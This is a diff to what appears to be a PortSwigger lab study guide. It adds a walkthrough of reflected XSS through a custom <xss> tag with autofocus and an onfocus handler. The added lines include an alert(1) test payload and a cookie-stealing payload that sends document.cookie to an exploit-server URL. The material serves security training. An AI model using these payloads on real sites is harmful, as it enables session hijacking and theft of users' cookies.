@@ -574,7 +574,27 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 </script>
 ```  
 
-![Custom XSS tag](images/custom-xss-tag.png)  
+![Custom XSS tag](images/custom-xss-tag.png)
+
+>Apart from creating a custom tag the way it is done above and calling it using `#`, it can also be done inside the proper custom tag without calling it explicitly in the URL:
+
+```HTML
+<xss autofocus tabindex=1 onfocus=alert(1)></xss>
+```
+
+>This code creates a custom tag `<xss>` and performs an `alert(1)` as the event inside the tag. If this string is placed on the search parameter, the result is the following:
+
+![Custom XSS](images/xss_custom.png)
+
+>The same way, we can build a payload to change `document.location` value to the Exploit server with the victim's cookies. An example:
+
+```HTML
+<xss autofocus tabindex=1 onfocus=document.location='https://exploit-0a0200e204b1e3f580a2345e018a0029.exploit-server.net/?c='+document.cookie></xss>
+```
+
+>Placing this payload in a `script` on the Exploit server like before, has the following impact:
+
+![Result XSS custom](images/result_xss_custom.png)
   
 [PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)  
 
